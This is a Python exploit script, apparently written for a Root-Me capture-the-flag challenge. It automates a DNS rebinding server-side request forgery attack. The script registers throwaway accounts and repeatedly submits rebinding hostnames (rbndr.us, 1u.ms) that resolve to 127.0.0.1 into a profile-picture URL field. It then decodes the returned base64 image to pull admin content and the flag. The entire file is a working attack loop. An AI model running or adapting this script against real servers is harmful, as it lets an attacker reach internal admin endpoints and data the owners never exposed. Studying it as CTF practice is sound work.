#!/usr/bin/env python3
import requests
import re
import base64
import uuid
import time
import random

BASE_URL = "https://instance-019c1dbd-d0a8-7399-8a92-e80e035fcedf.challenges.root-me.pro"

def create_session():
    """Create session with delays"""
    try:
        time.sleep(1)
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})
        username = f"u_{uuid.uuid4().hex[:8]}"
        password = "pass123"

        r1 = session.post(f"{BASE_URL}/register", data={"username": username, "password": password}, timeout=10)
        if r1.status_code not in [200, 302]:
            return None

        time.sleep(0.5)
        r2 = session.post(f"{BASE_URL}/login", data={"username": username, "password": password}, timeout=10)

        if r2.status_code in [200, 302] and "logout" in r2.text.lower():
            print(f"[+] Session created: {username}")
            return session
    except:
        pass
    return None

def get_rebind_urls():
    """Generate multiple DNS rebinding URLs with different services"""
    uid = uuid.uuid4().hex[:8]

    return [
        # rbndr.us - 7f000001=127.0.0.1, 08080808=8.8.8.8
        f"http://{uid}.7f000001.08080808.rbndr.us/admin",
        # Using different IPs
        f"http://{uid}.7f000001.01010101.rbndr.us/admin",
        # 1u.ms format
        f"http://make-1.1.1.1-and-127.0.0.1-rebind-{uid}.1u.ms/admin",
    ]

def try_attack(session, attempt):
    """Single attack attempt"""
    try:
        # Rotate through different rebinding services
        urls = get_rebind_urls()
        rebind_url = random.choice(urls)

        if attempt % 10 == 0:
            print(f"[Attempt {attempt}] Using: {rebind_url[:60]}...")

        r1 = session.post(f"{BASE_URL}/update-pp", data={"pp-url": rebind_url}, timeout=20)
        if r1.status_code in [502, 503]:
            print(f"[!] Server overload ({r1.status_code}), backing off...")
            time.sleep(5)
            return None

        time.sleep(0.5)
        r = session.get(f"{BASE_URL}/", timeout=10)

        match = re.search(r'<img src="data:image/png;base64,([^"]+)"', r.text)
        if match:
            b64_content = match.group(1)
            try:
                decoded = base64.b64decode(b64_content).decode('utf-8', errors='ignore')

                # Look for flag
                flag_match = re.search(r'RM\{[^}]+\}', decoded)
                if flag_match:
                    return ('FLAG', flag_match.group(0))

                # Look for admin content or flag keyword
                if ("flag" in decoded.lower() or "congrats" in decoded.lower()) and len(decoded) > 200:
                    return ('CONTENT', decoded)
            except:
                pass
    except Exception as e:
        if "50" in str(e):  # 502/503 errors
            time.sleep(3)

    return None

def main():
    print(f"[*] Multi-service DNS Rebinding Attack")
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] Services: rbndr.us, 1u.ms")
    print()

    session = create_session()
    if not session:
        print("[-] Failed to create initial session")
        return

    attempt = 0
    max_attempts = 500

    while attempt < max_attempts:
        attempt += 1
        result = try_attack(session, attempt)

        if result:
            result_type, content = result
            print(f"\n{'='*70}")
            print(f"[!!!] SUCCESS at attempt {attempt}!")
            print(f"{'='*70}")
            if result_type == 'FLAG':
                print(f"FLAG: {content}")
            else:
                print(f"Content (first 1000 chars):")
                print(content[:1000])
            print(f"{'='*70}")
            return

        time.sleep(0.3)  # Small delay between attempts

        # Refresh session every 50 attempts
        if attempt % 50 == 0:
            print(f"[*] Refreshing session at {attempt} attempts...")
            new_session = create_session()
            if new_session:
                session = new_session

    print(f"\n[-] Completed {attempt} attempts - no flag found")

if __name__ == "__main__":
    main()
